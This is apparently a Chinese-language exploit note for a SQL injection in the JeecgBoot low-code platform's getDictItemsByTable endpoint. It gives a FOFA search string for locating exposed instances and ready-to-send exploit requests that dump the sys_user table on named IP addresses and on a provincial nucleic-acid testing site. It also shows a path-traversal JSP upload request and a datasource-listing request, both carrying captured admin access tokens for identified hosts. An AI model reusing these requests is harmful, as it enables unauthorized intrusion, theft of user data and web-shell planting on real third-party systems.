# jeecgboot getDictItemsByTable sql 注入漏洞

    https://github.com/jeecgboot/jeecg-boot/issues?q=Injection

## fofa

```
app="JeecgBoot-企业级低代码平台"
```

## exp

```
GET /jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1
Host: 101.132.151.120:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
```

```
http://101.132.151.120:3000/jeecg-boot/sys/ng-alain/getDictItemsByTable/%27%20from%20%20jeecg_order_customer/%2A,%20%27/x.js
```

```
https://150.138.118.194:82/platform/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user%20limit%201,10/*,%20'/x.js
```



## 山东省核酸

```
https://naats.sdcdc.cn:7777//sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js
```

## 上传

```
POST /api/sys/common/upload HTTP/1.1
Host: www.qdctjt.com
Connection: close
Content-Length: 285
sec-ch-ua: "Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2cEzGmnqorzv3hWA
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2ODI1MTE1NjcsInVzZXJuYW1lIjoiYWRtaW4ifQ.7Rd9H6-qhBW0ZKIjU29IoSbjqJqrLF3lUVRIq8UMy4A
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
sec-ch-ua-platform: "macOS"
Accept: */*
Origin: http://admin.qdctjt.com
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://admin.qdctjt.com/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

------WebKitFormBoundary2cEzGmnqorzv3hWA
Content-Disposition: form-data; name="biz"

../../
------WebKitFormBoundary2cEzGmnqorzv3hWA
Content-Disposition: form-data; name="file"; filename=1.jsp
p
Content-Type: image/png

GIF89a
111
------WebKitFormBoundary2cEzGmnqorzv3hWA--

```

## 数据库

```
GET /sys/dataSource/list HTTP/1.1
Host: 58.59.2.164:8081
Accept: application/json, text/plain, */*
tenant_id: 0
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUwOTcxNTYsInVzZXJuYW1lIjoiMTMxNzMwMzI5MjQifQ.A6dBltBwYXmdZ2CTl3qJrZFpgxGxVu_iGMnizG9Ou2k
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Referer: http://58.59.2.164:8081/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```
